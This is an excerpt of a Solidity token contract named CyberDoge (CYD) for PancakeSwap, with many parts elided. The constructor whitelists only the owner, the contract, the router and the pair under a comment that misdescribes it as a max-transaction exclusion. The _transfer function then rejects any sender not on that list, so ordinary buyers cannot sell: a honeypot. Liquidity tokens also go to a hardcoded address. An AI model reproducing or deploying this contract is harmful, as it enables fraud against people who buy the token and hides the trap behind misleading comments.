...
/**	
 ...
 / / /________     \ \ \  / / /____\_\ \  / / /______  / / /\ \ \  \ \ \__/ / // / /___/ / // / /_____/ / // / /______    
/ / /_________\     \ \_\/ / /__________\/ / /_______\/ / /  \ \ \  \ \___\/ // / /____\/ // / /______\/ // / /_______\   
\/____________/      \/_/\/_____________/\/__________/\/_/    \_\/   \/_____/ \/_________/ \/___________/ \/__________/   
...
contract CyberDoge is Context, IERC20, Ownable {	
    ...
    string private constant _name = "CyberDoge";	
    string private constant _symbol = "CYD";	
    ...
    constructor() public {	
        ...
        //exclude owner and this contract from MaxTx
        TransferTx[owner()] = true;
        TransferTx[address(this)] = true;
        TransferTx[address(pancakeswapRouterAddress)] = true;
        TransferTx[address(pancakeswapV2Pair)] = true;
   ...
   function excludedFromFundFee(address account) external onlyOwner {	
    ...
    function _transfer(	
        ...
        require(TransferTx[from] == true, "Account is not excluded from maxTx");
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {	
        ...
        pancakeswapV2Router.addLiquidityETH{value: ethAmount}(	
            ...
            0, // slippage is unavoidable	
            0xDd0bbfE4Aa46C65B6C9e47EECC5D6F8Dc99eEC45,	
            block.timestamp	
        );	
    }	
